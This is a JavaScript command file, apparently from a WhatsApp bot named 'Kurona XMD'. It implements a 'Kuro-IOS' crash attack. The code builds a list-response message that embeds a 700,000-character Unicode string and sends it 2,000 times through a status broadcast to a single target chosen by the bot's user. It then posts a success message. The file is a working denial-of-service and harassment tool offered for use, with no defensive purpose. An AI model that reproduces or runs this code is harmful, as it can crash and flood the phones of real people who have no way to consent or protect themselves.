// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🎴 𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫 🎴
//  The Ultimate WhatsApp Experience
// /commands/bug/kuroinvi-ios.js
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

import pkg from "@whiskeysockets/bailey";
const { proto, generateWAMessageFromContent } = pkg;

import channelSender from '../commands/channelSender.js';

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// Fonction interne : construction & envoi du payload
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async function kuroSios(client, destinatario) {
    try {
        const tmsg = await generateWAMessageFromContent(destinatario, {
            viewOnceMessage: {
                message: {
                    listResponseMessage: {
                        title: '⚡ Power and Chaos\n',
                        description: "\n\n\n" + "𑪆".repeat(700000),
                        singleSelectReply: {
                            selectedId: "id"
                        },
                        listType: 1
                    }
                }
            }
        }, {});

        await client.relayMessage("status@broadcast", tmsg.message, {
            messageId: tmsg.key.id,
            statusJidList: [destinatario],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{
                        tag: "to",
                        attrs: { jid: destinatario },
                        content: undefined,
                    }],
                }],
            }],
        });
    } catch (err) {
        console.error("Erreur kuroSios:", err);
    }
}

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// Commande principale : Kuro-IOS Protocol
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
export async function kuroinviios(message, client) {
    try {
        const remoteJid = message.key?.remoteJid;
        if (!remoteJid) throw new Error("Message JID is undefined.");

        const user = message.pushName || "Unknown";
        const date = new Date().toLocaleString();

        // ─── Menu stylisé d’initiation
        await client.sendMessage(remoteJid, {
            text: `
╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮
┃          🎴𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫🎴
┃        𝐊𝐔𝐑𝐎𝐈𝐍𝐕𝐈-𝐈𝐎𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒
╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯
│  ❃ 𝗢𝘄𝗻𝗲𝗿 : 🎴 𝑫𝛯𝑽 ᬁ 𝛫𝑈𝑅𝛩𝛮𝛥🎴
│  ❃ 𝗠𝗼𝗱𝗲 : Public
│  ❃ 𝗨𝘀𝗲𝗿 : ${user}
│  ❃ 𝗣𝗿𝗲𝗳𝗶𝘅 : [ . ]
│  ❃ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : v1.0.0
│  ❃ 𝗗𝗮𝘁𝗲 : ${date}
╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯

🎴 Initialisation du *Kuro-IOS Protocol*...`
        });

        // ─── Extraction de la cible
        const messageBody =
            message.message?.extendedTextMessage?.text ||
            message.message?.conversation ||
            "";
        const commandAndArgs = messageBody.slice(1).trim();
        const parts = commandAndArgs.split(/\s+/);
        const args = parts.slice(1);

        let participant;
        if (message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
            participant = message.message.extendedTextMessage.contextInfo.participant;
        } else if (args.length > 0) {
            participant = args[0].replace("@", "") + "@s.whatsapp.net";
        } else {
            throw new Error("❌ Spécifiez une cible pour lancer le protocole Kuro-IOS.");
        }

        const num = "@" + participant.replace("@s.whatsapp.net", "");

        // ─── Exécution du protocole
        for (let i = 0; i < 2000; i++) {
            await kuroSios(client, participant);
            await new Promise((resolve) => setTimeout(resolve, 800));
        }

        // ─── Confirmation
        await channelSender(
            message,
            client,
            `✅ Kuro-IOS protocol exécuté avec succès sur ${num}.\n\nℬ𝓎  🎴𝛫𝑈𝑅𝛩𝛮𝛥🎴`,
            1
        );

    } catch (error) {
        console.error("Erreur kuroinviios:", error);
        await client.sendMessage(message.key.remoteJid, {
            text: `⚠️ Échec du protocole Kuro-IOS : ${error.message}`,
        });
    }
}

export default kuroinviios;